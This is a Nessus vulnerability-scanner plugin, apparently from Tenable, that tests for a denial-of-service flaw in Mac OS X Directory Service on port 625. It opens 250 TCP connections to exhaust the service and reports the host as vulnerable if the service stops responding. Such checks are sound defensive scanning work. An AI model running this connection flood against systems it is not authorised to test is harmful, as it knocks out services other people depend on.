#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(11603);
 script_version ("$Revision: 1.11 $");
 script_bugtraq_id(7323);
 script_xref(name:"OSVDB", value:"55137");
 
 script_name(english:"Mac OS X Directory Service Connection Saturation Remote DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host has an application that is affected by a denial
of service vulnerability." );
 script_set_attribute(attribute:"description", value:
"It was possible to disable the remote service (probably MacOS X's 
directory service) by making multiple connections to this port." );
 script_set_attribute(attribute:"see_also", value:"http://support.apple.com/kb/TA22265" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to MacOS X 10.2.5 or newer." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 
 script_summary(english:"Crashes the remote MacOS X Directory Service");
 
 if (ACT_FLOOD) script_category(ACT_FLOOD);
 else		script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 script_family(english:"Denial of Service");
 script_require_ports(625);
 script_require_keys("Settings/ParanoidReport");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");

if ( report_paranoia < 2 ) exit(0);

port = 625;

if (get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(!soc)exit(0);
 
 for(i=0;i<250;i++)
 {
  soc = open_sock_tcp(port);
  if(!soc){ security_warning(port); exit(0); }
 }
}
